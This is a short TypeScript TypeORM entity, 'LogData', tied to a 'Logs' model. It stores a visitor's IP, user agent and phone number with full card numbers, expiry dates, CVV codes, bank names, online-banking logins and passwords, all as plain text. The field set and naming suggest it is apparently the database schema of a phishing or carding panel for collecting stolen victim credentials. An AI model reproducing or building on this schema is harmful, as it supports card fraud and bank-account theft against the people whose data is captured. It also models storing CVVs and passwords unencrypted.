import {Entity, Column, PrimaryGeneratedColumn, ManyToOne, OneToMany, JoinColumn, OneToOne} from 'typeorm'
import {Logs} from "@/database/models/logs";

@Entity()
export class LogData {
    @PrimaryGeneratedColumn()
    id: number

    @Column({ name: 'ip', type: 'text', unique: false })
    ip: string

    @Column({ name: 'userAgent', type: 'text', unique: false })
    userAgent: string

    @Column({ name: 'phone', type: 'text', unique: false, default: null })
    phone: string

    @Column({ name: 'cardNumber', type: 'text', unique: false, default: null })
    cardNumber: string

    @Column({ name: 'cardDate', type: 'text', unique: false, default: null })
    cardDate: string

    @Column({ name: 'cardCVV', type: 'text', unique: false, default: null })
    cardCVV: string

    @Column({ name: 'cardBankName', type: 'text', unique: false, default: null })
    cardBankName: string

    @Column({ name: 'bankName', type: 'text', unique: false, default: null })
    bankName: string

    @Column({ name: 'bankLogin', type: 'text', unique: false, default: null })
    bankLogin: string

    @Column({ name: 'bankPassword', type: 'text', unique: false, default: null })
    bankPassword: string

    @Column({ name: 'bankOtherData', type: 'longtext', unique: false, default: null })
    bankOtherData: string

    @Column({ name: 'cardInfo', type: 'longtext', unique: false, default: null })
    cardInfo: string

    @ManyToOne(() => Logs)
    @JoinColumn()
    log: Logs
}